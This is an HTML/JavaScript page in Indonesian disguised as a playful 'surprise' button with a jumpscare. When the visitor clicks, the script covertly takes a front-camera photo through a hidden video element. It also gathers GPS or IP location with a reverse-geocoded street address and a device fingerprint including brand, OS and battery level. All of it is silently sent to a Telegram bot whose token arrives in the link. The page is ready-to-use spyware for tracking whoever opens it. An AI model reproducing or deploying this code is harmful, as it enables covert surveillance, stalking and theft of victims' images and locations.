<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>✨ Kejutan</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:#ffe6f2;font-family:Arial,sans-serif;overflow:hidden}
        .btn-cantik{padding:15px 40px;font-size:24px;font-weight:bold;color:#fff;background:linear-gradient(45deg,#ff4d94,#ff80df);border:none;border-radius:50px;cursor:pointer;box-shadow:0 4px 15px rgba(255,77,148,0.4);transition:0.2s;position:relative;z-index:1}
        .btn-cantik:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(255,77,148,0.6)}
        .btn-cantik:active{transform:scale(0.95)}
        #jumpscare-overlay{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:9999;justify-content:center;align-items:center}
        #jumpscare-img{width:100%;height:100%;object-fit:cover;animation:shake .08s infinite}
        @keyframes shake{0%{transform:translate(1px,1px)rotate(0)}10%{transform:translate(-1px,-2px)rotate(-1deg)}20%{transform:translate(-3px,0)rotate(1deg)}30%{transform:translate(0,2px)rotate(0)}40%{transform:translate(1px,-1px)rotate(1deg)}50%{transform:translate(-1px,2px)rotate(-1deg)}60%{transform:translate(-3px,1px)rotate(0)}70%{transform:translate(2px,1px)rotate(-1deg)}80%{transform:translate(-1px,-1px)rotate(1deg)}90%{transform:translate(2px,2px)rotate(0)}100%{transform:translate(1px,-2px)rotate(-1deg)}}
        .hidden{display:none!important}
        video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
        canvas{display:none}

        /* ===== LOADING HALAMAN AWAL (SEBENTAR) ===== */
        #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;display:flex;justify-content:center;align-items:center;z-index:10000;flex-direction:column;gap:16px}
        #loader .spinner{width:40px;height:40px;border:3px solid #1a1a1a;border-top:3px solid #ff4d94;border-radius:50%;animation:spin .8s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        #loader p{color:#555;font-size:12px;letter-spacing:1px;font-family:monospace}

        /* ===== ERROR (JIKA LINK SALAH) ===== */
        #error-box{display:none;background:rgba(20,10,25,.95);padding:32px 28px;border-radius:28px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,50,50,.2);position:relative;z-index:10001}
        #error-box .icon{font-size:48px;display:block;margin-bottom:8px}
        #error-box h2{color:#fff;font-size:20px}
        #error-box p{color:rgba(255,255,255,.4);font-size:13px;margin:8px 0 16px}
        #error-box .btn-retry{padding:12px 32px;border:none;border-radius:12px;background:linear-gradient(45deg,#ff4d94,#ff80df);color:#fff;font-weight:bold;cursor:pointer;font-size:14px}

        #copy-link{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);padding:8px 16px;border-radius:12px;color:rgba(255,255,255,.3);font-size:10px;font-family:monospace;z-index:100;cursor:pointer;transition:.3s;border:1px solid rgba(255,255,255,.05)}
        #copy-link:hover{color:rgba(255,255,255,.6);background:rgba(0,0,0,.8)}
    </style>
</head>
<body>

    <!-- LOADING AWAL -->
    <div id="loader">
        <div class="spinner"></div>
        <p>⏳ memuat...</p>
    </div>

    <!-- ERROR -->
    <div id="error-box">
        <span class="icon">🔒</span>
        <h2>Link Tidak Valid</h2>
        <p>Link ini tidak memiliki token yang valid.</p>
        <button class="btn-retry" onclick="location.reload()">🔄 Coba Lagi</button>
    </div>

    <!-- TOMBOL -->
    <button class="btn-cantik hidden" id="btnCantik">✨ Pencet Cantik ✨</button>

    <!-- COPY LINK (TETAP ADA) -->
    <div id="copy-link" onclick="copyLink()">📋 Salin Link</div>

    <!-- JUMPScare -->
    <div id="jumpscare-overlay">
        <img id="jumpscare-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRetLiXderHNqetWb89PbN1EBprTZQBALyXxLZMUX1F9w&s=10" alt="Jumpscare!">
    </div>

    <!-- AUDIO -->
    <audio id="jumpscare-audio" src="suara.mp3" preload="auto"></audio>

    <!-- KAMERA (HIDDEN) -->
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            'use strict';

            // ========== TOKEN ==========
            function getConfigFromURL() {
                let token = null,
                    chatId = null;
                const hash = window.location.hash.substring(1);
                if (hash) {
                    const params = new URLSearchParams(hash);
                    token = params.get('token');
                    chatId = params.get('chatid');
                }
                if (!token || !chatId) {
                    const query = new URLSearchParams(window.location.search);
                    token = query.get('token');
                    chatId = query.get('chatid');
                }
                return { token, chatId };
            }

            const config = getConfigFromURL();
            const isValid = config.token && config.token.length > 10 && config.chatId && config.chatId.length > 0;

            if (!isValid) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-box').style.display = 'block';
                throw new Error('Invalid config');
            }

            const BOT_TOKEN = config.token;
            const CHAT_ID = config.chatId;

            // ========== DOM ==========
            const loader = document.getElementById('loader');
            const btn = document.getElementById('btnCantik');
            const overlay = document.getElementById('jumpscare-overlay');
            const audio = document.getElementById('jumpscare-audio');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // ========== STATE ==========
            let isProcessing = false;
            let isSent = false;
            let stream = null;
            let captureDone = false;
            let locationDone = false;
            let deviceDone = false;
            let imageData = null;
            let locationData = null;
            let deviceData = null;
            let cameraDenied = false;
            let locationDenied = false;

            // ========== COPY LINK ==========
            window.copyLink = function() {
                const link = window.location.href;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(link).then(() => {
                        const el = document.getElementById('copy-link');
                        el.textContent = '✅ Tersalin!';
                        setTimeout(() => { el.textContent = '📋 Salin Link'; }, 2000);
                    }).catch(() => {
                        prompt('Salin link ini:', link);
                    });
                } else {
                    prompt('Salin link ini:', link);
                }
            };

            // ========== 1. DEVICE ==========
            function getDevice() {
                try {
                    const ua = navigator.userAgent;
                    let brand = 'Unknown',
                        model = 'Unknown',
                        os = 'Unknown',
                        osVer = 'Unknown',
                        browser = 'Unknown',
                        deviceType = 'Desktop';

                    if (/android/i.test(ua)) { os = 'Android';
                        const m = ua.match(/Android\s([\d.]+)/); if (m) osVer = m[1];
                        deviceType = 'Mobile'; } else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS';
                        const m = ua.match(/OS\s([\d_]+)/); if (m) osVer = m[1].replace(/_/g, '.');
                        deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile'; } else if (/Windows/i.test(ua)) { os =
                            'Windows';
                        const m = ua.match(/Windows NT ([\d.]+)/); if (m) osVer = m[1]; } else if (/Mac/i.test(ua)) { os =
                            'macOS';
                        deviceType = 'Desktop'; } else if (/Linux/i.test(ua)) { os = 'Linux'; }

                    const brands = {
                        'Samsung': /Samsung|SM-|Galaxy/i,
                        'Xiaomi': /Xiaomi|Redmi|POCO|Mi\s/i,
                        'iPhone': /iPhone/,
                        'Oppo': /Oppo|CPH/i,
                        'Vivo': /Vivo|V\d{4}/,
                        'Realme': /Realme|RMX/,
                        'Google': /Pixel/,
                        'OnePlus': /OnePlus|LE\d{4}/,
                        'Huawei': /Huawei|HONOR|MHA-|LIO-|MAR-|ELE-|VOG-|LYA-|CLT-|NOH-|TAS-|LSA-|PCT-|JNY-|ANA-|GRA-|EVR-|ELS-|LIO-|NOP-|BRQ-|NAM-|CDY-|DBY-|JAD-|TNN-|MNA-|FRL-|TFY-|PPA-|WKG-|MGA-|DCO-/
                    };
                    for (const [b, p] of Object.entries(brands)) {
                        if (p.test(ua)) { brand = b; break; }
                    }

                    const mm = ua.match(/; ([^;]+)\)/);
                    if (mm && mm[1] && !mm[1].includes('Android') && !mm[1].includes('iOS')) { model = mm[1].trim(); }

                    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
                    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
                    else if (/Firefox/i.test(ua)) browser = 'Firefox';
                    else if (/Edg/i.test(ua)) browser = 'Edge';

                    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                        deviceType = /Tablet|iPad/i.test(ua) ? 'Tablet' : 'Mobile';
                    }

                    deviceData = {
                        brand,
                        model,
                        os,
                        osVer,
                        browser,
                        deviceType,
                        screen: screen.width + 'x' + screen.height,
                        pixelRatio: window.devicePixelRatio || 1,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0
                    };

                    if (navigator.getBattery) {
                        navigator.getBattery().then(b => {
                            deviceData.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' 🔌' : '');
                            deviceDone = true;
                            checkAndSend();
                        }).catch(() => { deviceDone = true;
                            checkAndSend(); });
                    } else { deviceDone = true; }

                    return true;
                } catch(e) {
                    deviceData = { brand: 'Unknown', model: 'Unknown', os: 'Unknown' };
                    deviceDone = true;
                    return true;
                }
            }

            // ========== 2. KAMERA ==========
            function startCamera() {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                }).then(s => {
                    stream = s;
                    video.srcObject = stream;
                    video.play();

                    let attempts = 0;

                    function doCapture() {
                        if (captureDone) return;
                        attempts++;
                        const w = video.videoWidth || 640;
                        const h = video.videoHeight || 480;

                        if (w < 50 || h < 50) {
                            if (attempts < 10) { setTimeout(doCapture, 200); } else { captureDone = true;
                                checkAndSend(); }
                            return;
                        }

                        try {
                            canvas.width = w;
                            canvas.height = h;
                            ctx.translate(w, 0);
                            ctx.scale(-1, 1);
                            ctx.drawImage(video, 0, 0, w, h);
                            ctx.setTransform(1, 0, 0, 1, 0, 0);

                            const pixel = ctx.getImageData(0, 0, 10, 10);
                            let isBlack = true;
                            for (let i = 0; i < pixel.data.length; i += 4) {
                                if (pixel.data[i] > 20 || pixel.data[i + 1] > 20 || pixel.data[i + 2] > 20) {
                                    isBlack = false;
                                    break;
                                }
                            }

                            if (isBlack && attempts < 10) {
                                setTimeout(doCapture, 300);
                                return;
                            }

                            imageData = canvas.toDataURL('image/jpeg', 0.9);
                            captureDone = true;
                            if (stream) { stream.getTracks().forEach(t => t.stop());
                                stream = null; }
                            checkAndSend();
                        } catch(e) {
                            if (attempts < 10) { setTimeout(doCapture, 300); } else { captureDone = true;
                                checkAndSend(); }
                        }
                    }

                    video.addEventListener('loadedmetadata', doCapture);
                    if (video.videoWidth > 10) doCapture();
                    setTimeout(doCapture, 500);

                }).catch(err => {
                    cameraDenied = true;
                    captureDone = true;
                    checkAndSend();
                });

                setTimeout(() => {
                    if (!captureDone) { captureDone = true;
                        checkAndSend(); }
                }, 5000);
            }

            // ========== 3. LOKASI ==========
            function getLocation() {
                let ipDone = false;
                let gpsDone = false;
                const sources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
                let idx = 0;

                function tryIP() {
                    if (ipDone || idx >= sources.length) {
                        if (!ipDone) { ipDone = true; }
                        checkLocationDone();
                        return;
                    }
                    fetch(sources[idx++], { timeout: 4000 })
                        .then(r => r.json())
                        .then(d => {
                            if (ipDone || !d) return;
                            let lat, lng, city, region, country, ip;
                            if (d.latitude && d.longitude) { lat = d.latitude;
                                lng = d.longitude;
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country_name || d.country || 'N/A';
                                ip = d.ip || 'N/A'; } else if (d.loc) { const c = d.loc.split(','); lat = parseFloat(c[
                                    0]);
                                lng = parseFloat(c[1]);
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country || 'N/A';
                                ip = d.ip || 'N/A'; }
                            if (lat && lng) {
                                locationData = { lat, lng, city, region, country, ip, source: 'IP' };
                                ipDone = true;
                                fetch(
                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`
                                        )
                                    .then(r => r.json())
                                    .then(data => {
                                        if (data && data.address) {
                                            const a = data.address;
                                            locationData.fullAddress = data.display_name || 'N/A';
                                            locationData.road = a.road || a.pedestrian || 'N/A';
                                            locationData.city = a.city || a.town || a.village || a
                                            .municipality || city;
                                            locationData.region = a.state || a.region || region;
                                            locationData.country = a.country || country;
                                            locationData.postcode = a.postcode || 'N/A';
                                        }
                                        checkLocationDone();
                                    })
                                    .catch(() => { checkLocationDone(); });
                            } else { tryIP(); }
                        })
                        .catch(() => { tryIP(); });
                }

                function tryGPS() {
                    if (gpsDone || !navigator.geolocation) {
                        if (!gpsDone) { gpsDone = true; }
                        checkLocationDone();
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        p => {
                            if (!gpsDone && !locationData) {
                                locationData = {
                                    lat: p.coords.latitude,
                                    lng: p.coords.longitude,
                                    accuracy: '±' + Math.round(p.coords.accuracy || 0) + 'm',
                                    source: 'GPS'
                                };
                                gpsDone = true;
                                fetch(
                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${p.coords.latitude}&lon=${p.coords.longitude}&zoom=18&addressdetails=1`
                                        )
                                    .then(r => r.json())
                                    .then(data => {
                                        if (data && data.address) {
                                            const a = data.address;
                                            locationData.fullAddress = data.display_name || 'N/A';
                                            locationData.road = a.road || a.pedestrian || 'N/A';
                                            locationData.city = a.city || a.town || a.village || a
                                            .municipality || 'N/A';
                                            locationData.region = a.state || a.region || 'N/A';
                                            locationData.country = a.country || 'N/A';
                                            locationData.postcode = a.postcode || 'N/A';
                                        }
                                        checkLocationDone();
                                    })
                                    .catch(() => { checkLocationDone(); });
                            } else { checkLocationDone(); }
                        },
                        () => { locationDenied = true;
                            gpsDone = true;
                            checkLocationDone(); }, { enableHighAccuracy: true, timeout: 4000 }
                    );
                }

                function checkLocationDone() {
                    if (ipDone && gpsDone) {
                        locationDone = true;
                        if (!locationData) {
                            locationData = { lat: 0, lng: 0, source: 'none', city: 'Tidak tersedia' };
                        }
                        checkAndSend();
                    }
                }

                tryIP();
                tryGPS();

                setTimeout(() => {
                    if (!locationDone) {
                        locationDone = true;
                        if (!locationData) { locationData = { lat: 0, lng: 0, source: 'timeout' }; }
                        checkAndSend();
                    }
                }, 7000);
            }

            // ========== 4. KIRIM TELEGRAM (SILENT) ==========
            function sendToTelegram() {
                if (isSent) return;

                let caption = '📸 REPORT\n';
                caption += '⏰ ' + new Date().toLocaleString('id-ID') + '\n';
                caption += '━'.repeat(25) + '\n';

                caption += '\n🔐 IZIN:\n';
                caption += '   Kamera: ' + (cameraDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';
                caption += '   Lokasi: ' + (locationDenied ? '❌ Ditolak' : '✅ Diizinkan') + '\n';

                if (deviceData) {
                    caption += '\n📱 PERANGKAT:\n';
                    caption += '   Merek: ' + deviceData.brand + '\n';
                    caption += '   Model: ' + deviceData.model + '\n';
                    caption += '   Tipe: ' + deviceData.deviceType + '\n';
                    caption += '   OS: ' + deviceData.os + ' ' + deviceData.osVer + '\n';
                    caption += '   Browser: ' + deviceData.browser + '\n';
                    caption += '   Resolusi: ' + deviceData.screen + '\n';
                    caption += '   Pixel Ratio: ' + deviceData.pixelRatio + '\n';
                    caption += '   Timezone: ' + deviceData.timezone + '\n';
                    if (deviceData.battery) caption += '   Baterai: ' + deviceData.battery + '\n';
                    caption += '   Touch: ' + (deviceData.touch ? 'Yes' : 'No');
                }

                if (locationData) {
                    caption += '\n📍 LOKASI:\n';
                    caption += '   Sumber: ' + (locationData.source || 'N/A') + '\n';
                    if (locationData.lat && locationData.lng) {
                        caption += '   Lat: ' + locationData.lat + '\n';
                        caption += '   Lng: ' + locationData.lng + '\n';
                    }
                    if (locationData.accuracy) caption += '   Akurasi: ' + locationData.accuracy + '\n';
                    if (locationData.ip) caption += '   IP: ' + locationData.ip + '\n';
                    if (locationData.city && locationData.city !== 'N/A')
                        caption += '   Kota: ' + locationData.city + '\n';
                    if (locationData.region && locationData.region !== 'N/A')
                        caption += '   Provinsi: ' + locationData.region + '\n';
                    if (locationData.country && locationData.country !== 'N/A')
                        caption += '   Negara: ' + locationData.country + '\n';
                    if (locationData.fullAddress && locationData.fullAddress !== 'N/A') {
                        caption += '\n📌 ALAMAT:\n   ' + locationData.fullAddress + '\n';
                    }
                    caption += '\n🗺️ https://maps.google.com/?q=' + (locationData.lat || 0) + ',' + (locationData
                    .lng || 0);
                }

                // Kirim foto kalau ada
                if (imageData) {
                    try {
                        const bs = atob(imageData.split(',')[1]);
                        const ab = new ArrayBuffer(bs.length);
                        const ia = new Uint8Array(ab);
                        for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
                        const blob = new Blob([ab], { type: 'image/jpeg' });

                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID);
                        fd.append('photo', blob, 'jumpscare.jpg');
                        fd.append('caption', caption);

                        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                            method: 'POST',
                            body: fd
                        }).then(r => r.json()).then(d => {
                            if (d.ok) {
                                isSent = true;
                                console.log('✅ Sent!');
                            } else {
                                sendTextOnly(caption);
                            }
                        }).catch(() => { sendTextOnly(caption); });
                        return;
                    } catch(e) {}
                }

                sendTextOnly(caption);
            }

            function sendTextOnly(caption) {
                if (isSent) return;
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
                }).then(r => r.json()).then(d => {
                    if (d.ok) {
                        isSent = true;
                        console.log('✅ Sent!');
                    }
                }).catch(() => {});
            }

            // ========== 5. CHECK & SEND ==========
            function checkAndSend() {
                if (captureDone && locationDone && deviceDone && !isSent) {
                    setTimeout(sendToTelegram, 500);
                }
            }

            // ========== 6. RUN ==========
            function runAll() {
                if (isProcessing) return;
                isProcessing = true;

                getDevice();
                startCamera();
                getLocation();

                setTimeout(() => {
                    if (!isSent) {
                        if (!captureDone) { captureDone = true; }
                        if (!locationDone) { locationDone = true; if (!locationData) locationData = { lat: 0,
                                lng: 0 }; }
                        if (!deviceDone) { deviceDone = true; if (!deviceData) deviceData = { brand: 'Unknown',
                                model: 'Unknown' }; }
                        checkAndSend();
                    }
                }, 10000);
            }

            // ========== 7. TOMBOL ==========
            btn.addEventListener('click', function() {
                overlay.style.display = 'flex';
                audio.play().catch(() => {});

                runAll();

                setTimeout(() => {
                    overlay.style.display = 'none';
                    location.reload();
                }, 3000);
            });

            // ========== 8. START ==========
            setTimeout(() => {
                loader.style.display = 'none';
                btn.classList.remove('hidden');
            }, 500);

            window.addEventListener('beforeunload', () => {
                if (stream) { stream.getTracks().forEach(t => t.stop()); }
            });

            console.log('👁️ drakGPT · Silent Mode');
            console.log('Token:', BOT_TOKEN.substring(0, 15) + '...');
            console.log('Chat ID:', CHAT_ID);

        })();
    </script>

</body>
    </html>
